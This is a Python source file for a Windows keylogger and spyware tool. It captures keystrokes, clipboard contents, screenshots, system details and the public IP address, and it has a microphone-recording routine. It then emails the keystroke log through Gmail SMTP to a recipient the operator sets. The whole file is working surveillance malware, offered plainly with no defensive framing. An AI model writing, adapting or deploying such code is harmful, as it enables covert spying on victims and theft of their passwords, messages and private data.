import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#this file is use for geting key infomation like user typing different key
keys_information = "key_log.txt"

#this is use for getting informtion of system from user
system_information = "sys_info.txt"

#this use for getting infomation like which file user is copy pasting
clipborad_information = "clipboard.txt"

#this is use for creating audio file
audio_information = "audio.wav"
microphone_time = 10

#grabing screenshort
screen_information = "screeshort.png"

#sending file through email
email_address = "Enter Your email address"
password = "Enter YOur password"
to_address = "Enter Which person you wanted to send file"

file_path = "C:\\Users\\amey3\\OneDrive\\Desktop\\Keylogger"
extend = "\\"


def send_email(filename, attachment, to_address):
    try:
        from_address = email_address
        msg = MIMEMultipart()
        msg['From'] = from_address
        msg['TO'] = to_address
        msg['Subject'] = "Log File"
        body = "Body_of_the_EMail"
        msg.attach(MIMEText(body, 'plain'))
        filename = filename
        attachment = open(attachment, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "Attachment; filename = %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(from_address, password)
        text = msg.as_string()
        s.sendmail(from_address, to_address, text)
        s.quit()
    except :
        print("We are dissconneted form internet")

send_email(keys_information, file_path + extend + keys_information, to_address)


def computer_inforamtion():
    with open(file_path + extend + system_information, "a")as f:
        host_name = socket.gethostname()
        ip_add = socket.gethostbyname(host_name)
        try:
            public_ip = get("http://api.ipify.org").text
            f.write("public IP Address : " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP address")

        f.write("Process:" + (platform.processor() + '\n'))
        f.write("system:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + '\n')
        f.write("Hostname :" + host_name + '\n')
        f.write("IP address :" + ip_add + '\n')


computer_inforamtion()


def copy_clipborad():
    with open(file_path + extend + clipborad_information, "a")as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipborad Data : \n" + pasted_data)

        except:
            f.write("Clipborad dta could not be copied")


copy_clipborad()


def microphone():
    fs = 44100
    second = microphone_time
    my_recording = sd.rec(int(second * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, my_recording)


#microphone()

def screenshort():
    image = ImageGrab.grab()
    image.save(file_path + extend + screen_information)

screenshort()

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
